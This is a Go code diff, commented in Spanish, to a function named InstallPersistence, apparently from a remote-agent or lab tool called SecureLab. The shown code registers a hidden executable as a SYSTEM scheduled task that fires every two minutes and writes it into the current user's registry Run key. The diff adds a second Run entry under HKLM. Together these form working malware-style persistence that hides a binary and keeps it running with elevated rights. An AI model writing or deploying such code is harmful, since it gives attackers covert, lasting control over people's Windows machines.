@@ -26,9 +26,13 @@ func InstallPersistence(cfg *config.Config, log *logger.Logger) {
 	// Tarea programada
 	exec.Command("schtasks", "/Create", "/F", "/TN", "SecureLabHeartbeat",
 		"/TR", hiddenExe+" --watchdog", "/SC", "MINUTE", "/MO", "2", "/RU", "SYSTEM").Run()
-	// Registro Run
+	// Registro Run (HKCU)
 	k, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
 	k.SetStringValue("SecureLabAgent", hiddenExe)
 	k.Close()
+	// Registro Run (HKLM)
+	lk, _ := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
+	lk.SetStringValue("SecureLabAgent", hiddenExe)
+	lk.Close()
 	log.Info("Persistencia instalada.")
 }
